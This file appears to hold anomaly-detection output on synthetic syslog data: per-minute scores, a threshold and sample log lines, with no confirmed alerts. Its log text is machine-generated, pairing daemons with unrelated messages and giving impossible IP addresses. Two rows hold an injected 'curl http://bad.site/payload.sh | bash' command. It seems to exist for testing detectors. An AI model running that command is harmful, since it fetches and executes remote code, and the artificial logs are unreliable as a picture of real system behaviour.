bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 20:04:00,0.994789566895876,0,0,0.9999894441123176,3,57,ufw: Finished Daily apt download activities. || ntpd: Rotating log files. || unix_chkpwd: Started Cleanup of Temporary Directories. || smartd: Finished Daily apt download activities. || ufw: Accepted publickey for user from 10.0.0.197 port 22 ssh2. |
2026-07-01 20:05:00,0.9906498527442623,0,0,0.9999894441123176,3,59,unattended-upgrades: Started Cleanup of Temporary Directories. || smartd: Listening on LVM2 poll daemon socket. || redis-server: Started Session c250 of user root. || smartd: Rotating log files. || CRON: kernel: Out of memory: Kill process 53914 (pyt
2026-07-01 20:06:00,0.9981473181272792,0,0,0.9999894441123176,3,58,systemd: Rotating log files. || named: Finished Daily apt download activities. || cups: Started Cleanup of Temporary Directories. || NetworkManager: Listening on LVM2 poll daemon socket. || xinetd: Listening on LVM2 poll daemon socket. || docker: Rot
2026-07-01 20:07:00,0.9993343674058898,0,0,0.9999894441123176,3,59,smartd: Accepted publickey for user from 10.0.0.115 port 22 ssh2. || xinetd: Rotating log files. || redis-server: Started Session c28 of user root. || systemd: Started Session c82 of user root. || NetworkManager: Started Cleanup of Temporary Director
2026-07-01 20:08:00,0.999743367445877,0,0,0.9999894441123176,3,61,systemd: kernel: Out of memory: Kill process 43395 (python3) score 987 or sacrifice child || gpm: Rotating log files. || named: Started CUPS Scheduler. || unix_chkpwd: Listening on LVM2 poll daemon socket. || smartd: Synced RTC time from system clock
2026-07-01 20:09:00,0.9996009019431419,0,0,0.9999894441123176,3,59,rsyslogd: Started Session c226 of user root. || sudo: Started CUPS Scheduler. || dockerd: Listening on LVM2 poll daemon socket. || redis-server: Synced RTC time from system clock. || systemd: Finished Daily apt download activities. || systemd: Starte
2026-07-01 20:10:00,0.9986800684221171,0,0,0.9999894441123176,3,58,systemd-timesyncd: Finished Daily apt download activities. || chronyd: Synced RTC time from system clock. || gpm: Accepted publickey for user from 10.0.0.126 port 22 ssh2. || telnetd: Started Session c149 of user root. || rsyslogd: Listening on LVM2 
2026-07-01 20:11:00,0.9997660274676434,0,0,0.9999894441123176,3,61,telnetd: Finished Daily apt download activities. || docker: Started Session c233 of user root. || telnetd: Synced RTC time from system clock. || ufw: Listening on LVM2 poll daemon socket. || ntpd: Listening on LVM2 poll daemon socket. || smartd: Rota
2026-07-01 20:12:00,0.9996918834507027,0,0,0.9999894441123176,3,59,docker: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.126 port 22 ssh2. || smartd: Finished Daily apt download activities. || gpm: kernel: Out of memory: Kill process 61852 (python3) score 987 or sacrifice child || ftpd: Ro
2026-07-01 20:13:00,0.9999808009086325,0,0,0.9999894441123176,3,59,systemd: Rotating log files. || ufw: Accepted publickey for user from 10.0.0.152 port 22 ssh2. || dockerd: Started Cleanup of Temporary Directories. || NetworkManager: Accepted publickey for user from 10.0.0.7 port 22 ssh2. || ntpd: Listening on LVM2
2026-07-01 20:14:00,0.9997337897407117,0,0,0.9999894441123176,3,61,redis-server: Rotating log files. || chronyd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Finished Daily apt download activities. || systemd-timesyncd: Started Cleanup of Temporary Directories. || ntpd: Rotating log files. || ntpd: Accepted
2026-07-01 20:15:00,0.9980927821982251,0,0,0.9999894441123176,3,57,telnetd: Finished Daily apt download activities. || sshd: Listening on LVM2 poll daemon socket. || kernel: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.24926 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || sudo: Started CUPS Scheduler. || gpm: Rotating l
2026-07-01 20:16:00,0.9997953486867209,0,0,0.9999894441123176,3,57,sshd: Accepted publickey for user from 10.0.0.185 port 22 ssh2. || xinetd: Started Cleanup of Temporary Directories. || dockerd: Finished Daily apt download activities. || logrotate: Started Session c213 of user root. || sshd: Rotating log files. || 
2026-07-01 20:17:00,0.999696189114303,0,0,0.9999894441123176,3,57,kernel: Started Session c156 of user root. || dockerd: Started Cleanup of Temporary Directories. || sshd: Synced RTC time from system clock. || NetworkManager: Finished Daily apt download activities. || sudo: Finished Daily apt download activities. |
2026-07-01 20:18:00,0.9999538566389776,0,0,0.9999894441123176,3,62,redis-server: Started CUPS Scheduler. || ftpd: Rotating log files. || ntpd: Rotating log files. || ntpd: Started Cleanup of Temporary Directories. || cups: Started CUPS Scheduler. || ufw: Started Session c160 of user root. || chronyd: Rotating log fi
2026-07-01 20:19:00,0.9999825503413414,0,0,0.9999894441123176,3,58,gpm: Listening on LVM2 poll daemon socket. || dockerd: Accepted publickey for user from 10.0.0.127 port 22 ssh2. || CRON: Started CUPS Scheduler. || sshd: Finished Daily apt download activities. || CRON: Listening on LVM2 poll daemon socket. || syste
2026-07-01 20:20:00,0.9999632171158679,0,0,0.9999894441123176,3,65,kernel: Accepted publickey for user from 10.0.0.8 port 22 ssh2. || chronyd: Rotating log files. || docker: Started Cleanup of Temporary Directories. || gpm: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.42473 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 |
2026-07-01 20:21:00,0.9995717509033785,0,0,0.9999894441123176,3,59,docker: Accepted publickey for user from 10.0.0.230 port 22 ssh2. || ntpd: Listening on LVM2 poll daemon socket. || ufw: Listening on LVM2 poll daemon socket. || kernel: Listening on LVM2 poll daemon socket. || cups: Rotating log files. || docker: [U
2026-07-01 20:22:00,0.9936575268118732,0,0,0.9999894441123176,3,61,NetworkManager: Finished Daily apt download activities. || ftpd: kernel: Out of memory: Kill process 45232 (python3) score 987 or sacrifice child || smartd: Synced RTC time from system clock. || unattended-upgrades: Started Cleanup of Temporary Direc
2026-07-01 20:23:00,0.9992890572345664,0,0,0.9999894441123176,3,62,unix_chkpwd: Listening on LVM2 poll daemon socket. || logrotate: Failed password for invalid user test from 192.168.1.3012 port 22 ssh2 || unattended-upgrades: Started Session c183 of user root. || gpm: Finished Daily apt download activities. || gpm:
2026-07-01 20:24:00,0.990676141638205,0,0,0.9999894441123176,3,61,kernel: Accepted publickey for user from 10.0.0.23 port 22 ssh2. || logrotate: Finished Daily apt download activities. || redis-server: Listening on LVM2 poll daemon socket. || docker: Started Cleanup of Temporary Directories. || ufw: Listening on LV
2026-07-01 20:25:00,0.9956705494769641,0,0,0.9999894441123176,3,61,CRON: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started CUPS Scheduler. || CRON: Started Cleanup of Temporary Directories. || kernel: Rotating log files. || kernel: Listening on LVM2 poll daemon 
2026-07-01 20:26:00,0.9983356238437862,0,0,0.9999894441123176,3,60,cups: Started CUPS Scheduler. || NetworkManager: Accepted publickey for user from 10.0.0.35 port 22 ssh2. || dockerd: Synced RTC time from system clock. || gpm: Rotating log files. || gpm: Rotating log files. || ntpd: Rotating log files. || sudo: Syn
2026-07-01 20:27:00,0.9980365636928296,0,0,0.9999894441123176,3,58,telnetd: Accepted publickey for user from 10.0.0.11 port 22 ssh2. || cups: Failed password for invalid user test from 192.168.1.12901 port 22 ssh2 || named: Started Cleanup of Temporary Directories. || redis-server: Listening on LVM2 poll daemon sock
2026-07-01 20:28:00,0.9997250327380492,0,0,0.9999894441123176,3,62,CRON: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || CRON: Accepted publickey for user from 10.0.0.176 port 22 ssh2. || dockerd: Synced RTC time from system clock. || rsyslogd: Rotating log files. 
2026-07-01 20:29:00,0.9998672175370348,0,0,0.9999894441123176,3,62,CRON: Started Cleanup of Temporary Directories. || chronyd: Accepted publickey for user from 10.0.0.246 port 22 ssh2. || logrotate: Finished Daily apt download activities. || systemd: Started Cleanup of Temporary Directories. || smartd: Started CUPS 
2026-07-01 20:30:00,0.9995705385773785,0,0,0.9999894441123176,3,60,rsyslogd: Started Session c214 of user root. || telnetd: Finished Daily apt download activities. || kernel: Started Session c170 of user root. || docker: Started Cleanup of Temporary Directories. || redis-server: Listening on LVM2 poll daemon socket.
2026-07-01 20:31:00,0.9999615467018786,0,0,0.9999894441123176,3,57,docker: Rotating log files. || gpm: Started CUPS Scheduler. || redis-server: Started CUPS Scheduler. || unattended-upgrades: Started Session c128 of user root. || rsyslogd: Listening on LVM2 poll daemon socket. || cups: Started Session c95 of user ro
2026-07-01 20:32:00,0.9999728534714787,0,0,0.9999894441123176,3,62,cups: Finished Daily apt download activities. || chronyd: Started CUPS Scheduler. || docker: Accepted publickey for user from 10.0.0.64 port 22 ssh2. || gpm: Started Session c102 of user root. || systemd-timesyncd: Listening on LVM2 poll daemon socke
2026-07-01 20:33:00,0.9997578152223576,0,0,0.9999894441123176,3,60,rsyslogd: Started Session c168 of user root. || logrotate: Started Session c125 of user root. || sshd: Started Session c140 of user root. || sudo: Listening on LVM2 poll daemon socket. || redis-server: Accepted publickey for user from 10.0.0.22 port 
2026-07-01 20:34:00,0.999482400343705,0,0,0.9999894441123176,3,62,smartd: Started CUPS Scheduler. || redis-server: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || CRON: Started Cleanup of Temporary Directories. || kernel: Started Cleanup of Temporary Directories. || smartd: Star
2026-07-01 20:35:00,0.9997763217200133,0,0,0.9999894441123176,3,61,dockerd: Accepted publickey for user from 10.0.0.30 port 22 ssh2. || kernel: Rotating log files. || logrotate: Rotating log files. || xinetd: Rotating log files. || smartd: Listening on LVM2 poll daemon socket. || sudo: Listening on LVM2 poll daemon 
2026-07-01 20:36:00,0.9967323435947396,0,0,0.9999894441123176,3,61,unattended-upgrades: Listening on LVM2 poll daemon socket. || dockerd: Rotating log files. || telnetd: Started Session c11 of user root. || telnetd: Started CUPS Scheduler. || CRON: Synced RTC time from system clock. || unix_chkpwd: Listening on LVM2
2026-07-01 20:37:00,0.9950082072532783,0,0,0.9999894441123176,3,58,xinetd: Rotating log files. || smartd: Started CUPS Scheduler. || rsyslogd: Started CUPS Scheduler. || unattended-upgrades: Listening on LVM2 poll daemon socket. || kernel: Rotating log files. || gpm: Rotating log files. || systemd-timesyncd: Started
2026-07-01 20:38:00,0.9993070869471862,0,0,0.9999894441123176,3,58,smartd: Listening on LVM2 poll daemon socket. || sshd: Started Cleanup of Temporary Directories. || unattended-upgrades: Synced RTC time from system clock. || gpm: Accepted publickey for user from 10.0.0.240 port 22 ssh2. || xinetd: Started CUPS Sche
2026-07-01 20:39:00,0.9998246481479447,0,0,0.9999894441123176,3,57,NetworkManager: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || ufw: Listening on LVM2 poll daemon socket. || cups: Accepted publickey for user from 10.0.0.31 port 22 ssh2. || named: Started Cleanup of Temporary Directories. || smartd: F
2026-07-01 20:40:00,0.9928741377079469,0,0,0.9999894441123176,3,60,CRON: Started Session c112 of user root. || sudo: bash: -c: line 1: curl http://bad.site/payload.sh | bash || unix_chkpwd: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || CRON: Started Session c182 of user root. |
2026-07-01 20:41:00,0.9958719733597926,0,0,0.9999894441123176,3,58,CRON: Started Session c153 of user root. || unix_chkpwd: Listening on LVM2 poll daemon socket. || gpm: Started Cleanup of Temporary Directories. || NetworkManager: Listening on LVM2 poll daemon socket. || smartd: Synced RTC time from system clock. ||
2026-07-01 20:42:00,0.9997012150566285,0,0,0.9999894441123176,3,63,unix_chkpwd: Started Session c121 of user root. || gpm: Rotating log files. || kernel: Accepted publickey for user from 10.0.0.6 port 22 ssh2. || systemd: Accepted publickey for user from 10.0.0.190 port 22 ssh2. || rsyslogd: Synced RTC time from sys
2026-07-01 20:43:00,0.9987656460589174,0,0,0.9999894441123176,3,64,unix_chkpwd: Started Session c125 of user root. || named: Started CUPS Scheduler. || sshd: Synced RTC time from system clock. || ntpd: Finished Daily apt download activities. || chronyd: Started Cleanup of Temporary Directories. || telnetd: Rotating 
2026-07-01 20:44:00,0.9998338794637895,0,0,0.9999894441123176,3,59,docker: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Cleanup of Temporary Directories. || logrotate: Finished Daily apt download activities. || logrotate: Synced RTC time from system cl
2026-07-01 20:45:00,0.9993592689410067,0,0,0.9999894441123176,3,60,chronyd: Listening on LVM2 poll daemon socket. || sshd: Finished Daily apt download activities. || ntpd: Finished Daily apt download activities. || ftpd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || systemd-timesyncd: Started Session c
2026-07-01 20:46:00,0.9989707013258321,0,0,0.9999894441123176,3,60,telnetd: Started CUPS Scheduler. || dockerd: Accepted publickey for user from 10.0.0.154 port 22 ssh2. || sshd: Started CUPS Scheduler. || unattended-upgrades: Started Session c30 of user root. || CRON: Synced RTC time from system clock. || unix_chkp
2026-07-01 20:47:00,0.9997110675565228,0,0,0.9999894441123176,3,61,sudo: Started CUPS Scheduler. || xinetd: Rotating log files. || sudo: Failed password for invalid user test from 192.168.1.38001 port 22 ssh2 || docker: Started CUPS Scheduler. || xinetd: Finished Daily apt download activities. || cups: Started Sessi
2026-07-01 20:48:00,0.9988618449971329,0,0,0.9999894441123176,3,60,ftpd: Accepted publickey for user from 10.0.0.108 port 22 ssh2. || sshd: Accepted publickey for user from 10.0.0.107 port 22 ssh2. || NetworkManager: Accepted publickey for user from 10.0.0.11 port 22 ssh2. || unattended-upgrades: Started CUPS Schedu
2026-07-01 20:49:00,0.9996881725918426,0,0,0.9999894441123176,3,60,named: Synced RTC time from system clock. || CRON: Listening on LVM2 poll daemon socket. || sudo: Started Session c50 of user root. || telnetd: Started Session c37 of user root. || CRON: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || sy
2026-07-01 20:50:00,0.9859193385529929,0,0,0.9999894441123176,3,59,unix_chkpwd: Synced RTC time from system clock. || sudo: Accepted publickey for user from 10.0.0.178 port 22 ssh2. || kernel: Synced RTC time from system clock. || gpm: Started Session c221 of user root. || xinetd: Listening on LVM2 poll daemon socke
2026-07-01 20:51:00,0.9916094091698014,0,0,0.9999894441123176,3,58,docker: Started Cleanup of Temporary Directories. || telnetd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Synced RTC time from system clock. || named: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.29965 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0
